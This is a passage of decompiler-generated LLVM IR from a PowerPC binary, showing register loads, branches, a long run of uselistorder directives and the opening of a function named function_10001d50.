  store i32 %v1_10001c7c, i32* @r31, align 4
  store i32 268442756, i32* %lr.global-to-local, align 4
  %v2_10001c80 = inttoptr i32 %v0_10001c70 to i8*
  %v3_10001c80 = call i32 @function_1000ab8c(i8* %v2_10001c80, i32 %v0_10001c78)
  store i32 %v3_10001c80, i32* %r3.global-to-local, align 4
  %v0_10001c84 = load i32, i32* %r21.global-to-local, align 4
  %v1_10001c84 = load i32, i32* %r28.global-to-local, align 4
  %v2_10001c84 = icmp slt i32 %v0_10001c84, %v1_10001c84
  %v3_10001c84 = icmp sgt i32 %v0_10001c84, %v1_10001c84
  %v4_10001c84 = icmp eq i32 %v0_10001c84, %v1_10001c84
  store i1 %v2_10001c84, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001c84, i1* %cr7_gt.global-to-local, align 1
  store i1 %v4_10001c84, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10001c84, label %dec_label_pc_10001c8c, label %dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge

dec_label_pc_10001c70.dec_label_pc_100004c8_crit_edge: ; preds = %dec_label_pc_10001c70
  %v2_100004d4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100004c8

dec_label_pc_10001c8c:                            ; preds = %dec_label_pc_10001c70
  %v0_10001c8c = load i32, i32* @r1, align 4
  %v1_10001c8c = add i32 %v0_10001c8c, 20804
  %v2_10001c8c = inttoptr i32 %v1_10001c8c to i32*
  %v3_10001c8c = load i32, i32* %v2_10001c8c, align 4
  store i32 %v3_10001c8c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100005c4.preheader

; uselistorder directives
  uselistorder i32 %v3_10001c8c, { 1, 0 }
  uselistorder i32 %v0_10001c8c, { 1, 0 }
  uselistorder i32 %v1_10001c84, { 1, 2, 3, 0 }
  uselistorder i32 %v2_10001b94, { 2, 1, 0, 3 }
  uselistorder i8 %v4_10001b60, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v2_10001b5c, { 1, 2, 0 }
  uselistorder i1 %v3_10001b4c, { 1, 0 }
  uselistorder i32 %v0_10001b3c, { 1, 0 }
  uselistorder i1 %v3_10001b38, { 1, 0 }
  uselistorder i32 %v3_10001b0c, { 1, 0 }
  uselistorder i32 %v0_10001b14, { 2, 0, 1 }
  uselistorder i32 %v2_10001acc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_10001aa8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001a84, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001a74, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_10001a4c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001a34, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_100019dc, { 1, 0, 2 }
  uselistorder i32 %v0_100019d0, { 1, 0 }
  uselistorder i32 %v3_10001994, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001978, { 1, 0, 2 }
  uselistorder i32 %v4_1000196c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001928, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100018cc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v2_100018a8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001884, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10001874, { 0, 3, 2, 1, 4 }
  uselistorder i8 %v4_10001864, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_1000185c, { 0, 2, 1 }
  uselistorder i1 %v3_1000184c, { 1, 0 }
  uselistorder i1 %v3_10001838, { 1, 0 }
  uselistorder i32 %v0_10001814, { 2, 0, 1 }
  uselistorder i32 %v2_100017ec, { 2, 1, 0, 3 }
  uselistorder i32 %v4_100017a8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10001740, { 2, 1, 0, 3 }
  uselistorder i32 %v0_10001714, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100016f0, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_100016d8, { 1, 0 }
  uselistorder i32 %v0_100016d8, { 1, 0 }
  uselistorder i32 %v3_100019cc, { 2, 0, 3, 1 }
  uselistorder i32 %v5_100016a0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10001674, { 2, 1, 0 }
  uselistorder i32 %v0_10001674, { 1, 0 }
  uselistorder i32 %v0_10001658, { 1, 0 }
  uselistorder i32 %v1_10001648, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v0_1000163c, { 0, 2, 1 }
  uselistorder i32 %v1_10001624, { 1, 2, 3, 0 }
  uselistorder i32 %v5_100015e4, { 0, 1, 5, 4, 3, 2, 6, 9, 8, 7, 10 }
  uselistorder i32 %v3_100015d0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1000158c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000154c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001538, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_100014a8, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10001488, { 1, 0 }
  uselistorder i32 %v5_1000146c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10001454, { 1, 0 }
  uselistorder i32 %v4_10001448, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001400, { 1, 2, 0 }
  uselistorder i32 %v0_100013d0, { 1, 0 }
  uselistorder i32 %v3_100013bc, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1000139c, { 6, 5, 4, 7, 3, 0, 2, 1 }
  uselistorder i32* %v2_1000139c, { 1, 0 }
  uselistorder i32 %v0_1000139c, { 1, 0 }
  uselistorder i32 %v3_10001388, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_10001370, { 1, 2, 0 }
  uselistorder i32 %v0_10001364, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_10001354, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_1000145c, { 0, 2, 1 }
  uselistorder i32 %v3_10001344, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1000133c, { 2, 1, 0 }
  uselistorder i32 %v1_10001308, { 0, 3, 2, 1 }
  uselistorder i32 %v3_100012a4, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1000125c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1000124c, { 0, 2, 1 }
  uselistorder i32 %v4_1000123c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10001214, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_10001210, { 2, 1, 0, 3 }
  uselistorder i32 %v5_100011cc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_100011ac, { 1, 0 }
  uselistorder i32 %v5_1000118c, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10001178, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10001134, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10001110, { 2, 1, 0, 3 }
  uselistorder i1 %v3_100010c0, { 0, 2, 1 }
  uselistorder i32 %v3_100010d8, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %v2_100010d8, { 0, 2, 1 }
  uselistorder i32 %v2_100010d4, { 2, 1, 0, 3 }
  uselistorder i32 %v4_1000107c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v5_10001044, { 5, 0, 4, 3, 2, 1, 8, 7, 6, 9 }
  uselistorder i32 %v0_10001010, { 0, 2, 1 }
  uselistorder i32 %v4_1000100c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10000fe8, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000fdc, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10000f84, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10000f70, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10000f2c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000f00, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10000eb8, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10000ea4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10000e60, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000e2c, { 2, 1, 0, 3 }
  uselistorder i32 %v5_10000de4, { 0, 1, 5, 4, 3, 2, 8, 7, 6, 9 }
  uselistorder i32 %v3_10000dd0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_10000d8c, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000d58, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000d2c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_100017d4, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v5_10000ce8, { 2, 1, 0, 3 }
  uselistorder i32 %v4_10000cc4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_10000c98, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_10000c84, { 1, 0 }
  uselistorder i32 %v1_10000c6c, { 1, 0 }
  uselistorder i32 %v2_10000c5c, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v1_10000c54, { 1, 0 }
  uselistorder i32 %v1_10000c34, { 1, 0 }
  uselistorder i32 %v2_10000c20, { 1, 0, 3, 4, 5, 2 }
  uselistorder i32 %v3_10000bf4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10000b90, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_10000b8c, { 2, 1, 0, 3 }
  uselistorder i32 %v3_10000b3c, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_10000b18, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_1000089c, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10000870, { 1, 0 }
  uselistorder i32 %v1_10000858, { 2, 1, 0 }
  uselistorder i32 %v1_10000848, { 1, 0 }
  uselistorder i32 %v3_10000838, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v1_10000824, { 2, 1, 0, 3 }
  uselistorder i1 %v3_1000081c, { 1, 0 }
  uselistorder i1 %v3_10000814, { 1, 0 }
  uselistorder i32 %v1_10000800, { 1, 0 }
  uselistorder i32 %v1_100007f0, { 1, 0 }
  uselistorder i32 %v0_100007b4, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %v1_10000784, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10000768, { 1, 0 }
  uselistorder i32 %v2_10000758, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v3_100006cc, { 1, 0, 4, 3, 2, 5 }
  uselistorder i8 %v3_10000688, { 14, 15, 16, 17, 18, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_10000688, { 0, 1, 3, 2 }
  uselistorder i32 %v2_10000c8c, { 5, 6, 2, 3, 0, 1, 7, 4 }
  uselistorder i32 %v1_10000678, { 2, 1, 0, 3 }
  uselistorder i1 %v3_10000660, { 1, 0 }
  uselistorder i1 %v3_10000658, { 1, 0 }
  uselistorder i1 %v3_10000650, { 1, 0 }
  uselistorder i1 %v3_10000648, { 1, 0 }
  uselistorder i1 %v3_10000640, { 1, 0 }
  uselistorder i32 %v1_1000060c, { 1, 0 }
  uselistorder i32 %v1_100005ec, { 1, 0 }
  uselistorder i32 %v1_100005a0, { 1, 0 }
  uselistorder i32 %v3_10000590, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_10000440., { 1, 2, 0 }
  uselistorder i32 %v1_10000418, { 1, 2, 3, 0 }
  uselistorder i32 %v3_10000404, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_10000400, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100003e8, { 2, 1, 0, 3 }
  uselistorder i32 %v2_100003d8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1000038c, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 13, 12, 14, 15 }
  uselistorder i32 %v2_10000368, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_1000035c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10000238, { 1, 0 }
  uselistorder i32 %v2_10000214, { 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 0, 11, 12 }
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 74, 76, 75, 77, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 70, 71, 72, 73, 47, 48, 49, 50, 53, 54, 51, 52, 55, 56, 57, 58, 59, 61, 60, 1, 63, 62, 0, 64, 65, 66, 67, 68, 69 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 142, 144, 145, 143, 4, 6, 5, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 47, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 67, 69, 68, 70, 71, 72, 73, 74, 76, 75, 77, 78, 79, 80, 81, 83, 82, 85, 84, 87, 86, 88, 89, 90, 134, 135, 136, 137, 138, 139, 140, 141, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 123, 122, 124, 125, 126, 127, 128, 130, 129, 132, 131, 133, 146 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32* %r30.global-to-local, { 3, 5, 22, 23, 24, 25, 26, 6, 7, 8, 9, 10, 13, 11, 12, 4, 0, 14, 2, 15, 16, 17, 18, 19, 1, 20, 21, 27, 28, 29, 30, 31 }
  uselistorder i32* %r3.global-to-local, { 10, 11, 12, 13, 14, 15, 16, 291, 292, 293, 294, 300, 5, 301, 302, 303, 304, 305, 306, 307, 295, 296, 297, 298, 299, 308, 309, 310, 311, 312, 313, 314, 315, 316, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 48, 9, 8, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 87, 86, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 1, 174, 175, 176, 177, 276, 275, 277, 4, 278, 279, 280, 281, 282, 284, 283, 285, 286, 287, 288, 289, 290, 178, 179, 181, 180, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 198, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 221, 222, 220, 223, 224, 225, 226, 6, 227, 228, 229, 230, 231, 234, 232, 233, 2, 235, 236, 237, 238, 239, 3, 240, 241, 242, 243, 244, 245, 247, 246, 248, 250, 249, 251, 252, 253, 254, 255, 257, 256, 258, 259, 260, 261, 262, 263, 266, 264, 265, 267, 268, 269, 270, 271, 272, 273, 274, 7, 317, 0 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 93, 26, 14, 44, 45, 46, 94, 95, 96, 97, 99, 98, 100, 6, 7, 8, 9, 10, 34, 35, 36, 37, 38, 41, 39, 40, 42, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 82, 28, 22, 23, 24, 25, 27, 29, 30, 31, 32, 33, 50, 43, 47, 48, 49, 51, 53, 52, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 91, 92, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 79, 81, 83, 84, 85, 86, 87, 88, 89, 90 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 34, 2, 3, 4, 44, 45, 5, 6, 11, 7, 8, 9, 10, 26, 27, 28, 14, 15, 16, 12, 13, 17, 18, 19, 20, 21, 22, 23, 24, 25, 29, 31, 30, 32, 33, 35, 36, 37, 39, 40, 38, 42, 41, 43 }
  uselistorder i32* %r27.global-to-local, { 25, 30, 29, 31, 14, 1, 3, 4, 0, 2, 20, 5, 7, 6, 8, 9, 10, 11, 15, 12, 13, 16, 17, 18, 19, 22, 21, 23, 26, 24, 27, 28 }
  uselistorder i32* %r26.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 9, 8, 12, 10, 11, 13, 14, 18, 15, 19, 16, 20, 17, 21, 23, 24, 22, 25, 26 }
  uselistorder i32* %r25.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 13, 12, 15, 14, 16, 11, 17 }
  uselistorder i32* %r24.global-to-local, { 35, 3, 5, 6, 7, 8, 0, 1, 2, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 4, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39 }
  uselistorder i32* %r23.global-to-local, { 1, 13, 2, 3, 4, 5, 6, 14, 7, 8, 9, 10, 11, 16, 17, 0, 12, 15, 18, 19, 21, 22, 20, 23 }
  uselistorder i32* %r22.global-to-local, { 45, 44, 46, 47, 48, 1, 49, 53, 50, 52, 51, 0, 54, 3, 2, 6, 4, 5, 7, 9, 8, 11, 10, 13, 12, 14, 15, 17, 16, 19, 18, 21, 20, 23, 22, 25, 24, 27, 26, 29, 28, 31, 30, 33, 32, 35, 34, 37, 36, 39, 38, 41, 40, 43, 42, 55, 57, 56, 58 }
  uselistorder i32* %r20.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 0, 31, 32 }
  uselistorder i32* %r19.global-to-local, { 3, 0, 1, 2, 4, 5, 6, 7 }
  uselistorder i32* %r18.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18, 19, 20 }
  uselistorder i32* %r15.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r14.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 43, 44, 45, 46, 47, 48, 49, 50, 52, 51, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 41, 42, 28, 27, 29, 30, 31, 32, 1, 33, 0, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 109, 110, 111, 112, 114, 113, 115, 116, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 42, 40, 41, 43, 44, 45, 47, 46, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 107, 108, 70, 72, 71, 73, 76, 74, 75, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 117, 118 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 110, 112, 111, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 103, 104, 105, 106, 107, 108, 109, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 113, 114 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 1, 4, 5, 7, 6, 0, 8, 9, 10 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 118, 120, 119, 121, 124, 125, 126, 127, 122, 123, 128, 129, 130, 131, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 45, 39, 40, 41, 42, 43, 44, 46, 47, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 115, 116, 117, 83, 84, 89, 88, 85, 86, 87, 90, 91, 92, 93, 94, 95, 102, 103, 96, 97, 98, 99, 100, 101, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i1* %cr7_gt.global-to-local, { 1, 118, 120, 119, 121, 124, 125, 126, 127, 122, 123, 128, 129, 130, 131, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 44, 38, 39, 40, 41, 42, 43, 45, 46, 47, 49, 48, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 115, 116, 117, 83, 84, 89, 88, 85, 86, 87, 90, 91, 92, 93, 94, 95, 102, 103, 96, 97, 98, 99, 100, 101, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 120, 122, 121, 123, 126, 127, 128, 129, 124, 125, 130, 131, 132, 133, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 46, 39, 40, 41, 42, 43, 44, 45, 47, 48, 49, 51, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 117, 118, 119, 85, 86, 91, 90, 87, 88, 89, 92, 93, 94, 95, 96, 97, 104, 105, 98, 99, 100, 101, 102, 103, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116 }
  uselistorder i1* %cr3_eq.global-to-local, { 1, 0, 2 }
  uselistorder i32 268441368, { 1, 0 }
  uselistorder i8 34, { 3, 4, 5, 0, 1, 2, 6, 7, 8 }
  uselistorder i32 1579, { 0, 1, 2, 3, 5, 6, 7, 8, 9, 4, 10, 11, 12, 13 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1000de64.40 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000de60.39 to i32), { 1, 0, 2 }
  uselistorder i32 931, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000ac30, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 35, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 10240, { 2, 0, 1, 3, 4 }
  uselistorder i8 7, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1000de34.24 to i32), { 0, 8, 1, 2, 3, 4, 5, 6, 9, 7, 10, 11 }
  uselistorder i32 3140, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 43, { 0, 2, 1, 3 }
  uselistorder i32 37, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1000de40.7 to i32), { 1, 2, 0 }
  uselistorder i32 268435604, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10001b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001a9c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100019dc, { 1, 0 }
  uselistorder label %dec_label_pc_100019ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000189c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001870, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10001810, { 1, 0 }
  uselistorder label %dec_label_pc_100017bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001758, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10001708, { 1, 0 }
  uselistorder label %dec_label_pc_100016e4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10001680, { 1, 0 }
  uselistorder label %dec_label_pc_10001658, { 1, 0 }
  uselistorder label %dec_label_pc_10001600, { 1, 0 }
  uselistorder label %dec_label_pc_10001558, { 1, 0 }
  uselistorder label %dec_label_pc_100014d0, { 1, 0 }
  uselistorder label %dec_label_pc_10001364, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000133c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100011f0, { 1, 0 }
  uselistorder label %dec_label_pc_100011e4, { 5, 6, 1, 7, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_100011a4, { 1, 0 }
  uselistorder label %dec_label_pc_100010f0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100010d0, { 1, 0 }
  uselistorder label %dec_label_pc_100010a0, { 1, 0 }
  uselistorder label %dec_label_pc_10001064, { 1, 0 }
  uselistorder label %dec_label_pc_10001024, { 1, 0 }
  uselistorder label %dec_label_pc_10000fe8, { 1, 0 }
  uselistorder label %dec_label_pc_10000fbc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10000f9c, { 1, 0 }
  uselistorder label %dec_label_pc_10000f14, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000ed0, { 1, 0 }
  uselistorder label %dec_label_pc_10000e40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10000dfc, { 1, 0 }
  uselistorder label %dec_label_pc_10000d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10000d40, { 1, 0 }
  uselistorder label %dec_label_pc_10000cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10000c00, { 1, 0 }
  uselistorder label %dec_label_pc_10000be8, { 1, 0 }
  uselistorder label %dec_label_pc_10000bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10000b50, { 1, 0 }
  uselistorder label %dec_label_pc_10000b18, { 1, 0 }
  uselistorder label %dec_label_pc_100008b0, { 1, 0 }
  uselistorder label %dec_label_pc_10000824, { 15, 7, 2, 8, 0, 3, 9, 10, 11, 12, 13, 1, 14, 6, 4, 5 }
  uselistorder label %dec_label_pc_100007ec, { 1, 0 }
  uselistorder label %dec_label_pc_100006c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000069c, { 1, 0 }
  uselistorder label %dec_label_pc_10000678, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10000600.dec_label_pc_10000600_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100005e0.dec_label_pc_100005e0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100005c4, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_100005c4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100005b4, { 1, 0 }
  uselistorder label %dec_label_pc_10000578, { 1, 0 }
  uselistorder label %dec_label_pc_10000530, { 1, 0 }
  uselistorder label %dec_label_pc_10000430, { 1, 0 }
}

define i32 @function_10001d50(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10001d50:
  %ctr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %ctr.global-to-local, align 4
  %v0_10001d5c = load i32, i32* @lr, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  call void @__pseudo_cond_branch(i1 %tmp4, i32 %v0_10001d5c)
  %v1_10001d60 = add i32 %tmp, 4
  %v2_10001d60 = inttoptr i32 %v1_10001d60 to i8*
  %v3_10001d60 = load i8, i8* %v2_10001d60, align 1
  %v4_10001d60 = zext i8 %v3_10001d60 to i32
  %v4_10001d68 = icmp eq i32 %v4_10001d60, %arg3
  br i1 %v4_10001d68, label %dec_label_pc_10001d90, label %dec_label_pc_10001d84.preheader

dec_label_pc_10001d84.preheader:                  ; preds = %dec_label_pc_10001d50
